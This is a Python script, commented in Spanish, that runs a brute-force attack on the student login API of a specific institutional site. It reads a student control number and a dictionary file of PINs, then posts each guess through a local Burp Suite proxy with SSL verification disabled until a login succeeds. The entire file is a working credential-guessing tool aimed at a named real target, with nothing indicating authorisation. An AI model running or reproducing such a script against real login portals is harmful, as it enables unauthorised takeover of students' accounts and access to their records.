import requests
import time

# Configuración del proxy para Burp Suite (asegúrate de que Burp Suite esté activo)
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}

def bruteforce_login():
    """
    Realiza un ataque de fuerza bruta sobre un panel de login vulnerable.
    El número de control es ingresado manualmente, mientras que los NIPs
    son leídos de un archivo .txt proporcionado por el usuario.
    """
    print("=== Script de Fuerza Bruta ===")
    numero_control = input("Introduce el número de control (por ejemplo, 21270612): ")
    archivo_nips = input("Introduce el nombre del archivo con los NIPs (por ejemplo, diccionario.txt): ")

    try:
        # Abrir el archivo con los NIPs
        with open(archivo_nips, "r") as archivo:
            for nip in archivo:
                nip = nip.strip()
                print(f"Probando NIP: {nip}")

                # Configuración del payload para el POST
                payload = {
                    "controlNumber": numero_control,
                    "nip": nip
                }

                try:
                    # Realizar la solicitud POST con proxy y sin verificación SSL
                    response = requests.post(
                        "https://estudiantes.tuxtla.tecnm.mx/api/login",
                        json=payload,
                        proxies=proxies,
                        verify=False  # Ignorar errores SSL
                    )

                    # Verificar si la solicitud fue exitosa
                    if response.status_code == 200:
                        print(f"¡Login exitoso con NIP: {nip}!")
                        break
                    else:
                        print(f"Error en el login: {response.status_code}")
                        print(response.json())

                except requests.exceptions.RequestException as e:
                    print(f"Error al conectar con el servidor: {e}")

                # Agregar un delay para evitar saturar el servidor
                print("Esperando 10 segundos antes de probar el siguiente NIP...")
                time.sleep(10)

    except FileNotFoundError:
        print(f"Archivo {archivo_nips} no encontrado. Asegúrate de que exista en la misma carpeta del script.")

if __name__ == "__main__":
    bruteforce_login()
